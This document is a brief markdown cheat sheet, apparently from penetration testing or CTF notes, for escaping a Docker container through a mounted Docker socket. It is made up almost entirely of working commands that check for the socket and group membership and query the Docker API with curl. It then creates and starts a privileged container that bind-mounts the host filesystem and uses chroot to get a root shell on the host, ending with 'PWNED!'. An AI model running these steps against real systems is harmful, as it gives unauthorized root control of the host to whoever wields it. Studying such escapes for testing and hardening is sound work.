# REQUIREMENTS:

### 1) User must be in docker group to run docker commands (or root in the container)

### 2) Docker socket must be exposed

## STEPS:

#### 1) Check if the Docker sock is mounted

    cd /var/run 

    ls -la | grep sock

#### 3) Check if our user can run Docker commands

    id
    groups

#### 4) Check if any images are already on the host

    docker images

OR use curl

    curl --unix-socket /var/run/docker.sock http://localhost/images/json

##### If not, download an Alpine image to host to import the image, then mount.

#### 4.5) Create a new container in the existing image

    curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
      "Image": "IMAGE_NAME",
      "Cmd": ["/bin/sh"],
      "Tty": true,
      "HostConfig": {
        "Privileged": true,
        "Binds": ["/:/host"]
      }
    }' http://localhost/containers/create

##### Save ID from the output

Start the container

    curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/1eb09c200c4997d44902548fa8cd2ce500083fcbda33ee330f46c0ae8e997b4d/start


#### 5) Escape the container

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

OR from 4.5 steps

    docker exec -it 1eb09c200c4997d44902548fa8cd2ce500083fcbda33ee330f46c0ae8e997b4d chroot /host /bin/bash

#### 6) PWNED!
